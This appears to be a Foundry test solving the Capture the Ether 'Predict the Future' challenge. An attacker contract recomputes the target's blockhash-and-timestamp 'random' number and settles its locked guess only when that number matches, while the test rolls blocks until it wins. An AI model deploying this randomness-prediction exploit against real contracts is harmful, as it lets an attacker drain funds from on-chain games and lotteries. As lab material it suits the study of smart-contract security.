pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/capture-the-ether/PredictTheFuture.sol";

contract MiddleMan {
    function lockInGuess(address prey) public {
        PredictTheFuture(prey).lockInGuess(0);
    }

    function attack(address prey) public {
        if (0 == uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10)) {
            PredictTheFuture(prey).settle();
        }
    }
}

contract PredictTheFutureTest is Test {
    PredictTheFuture instance;

    function setUp() public {
        instance = new PredictTheFuture();
    }

    function test() public {
        assertFalse(instance.isComplete());

        MiddleMan middleMan = new MiddleMan();
        middleMan.lockInGuess(address(instance));
        uint256 blockNumber = block.number;
        vm.roll(blockNumber + 2);

        for (uint8 i; i < 100; ++i) {
            middleMan.attack(address(instance));

            if (instance.isComplete()) {
                break;
            } else {
                vm.roll(blockNumber + 3 + i);
            }
        }
    }
}
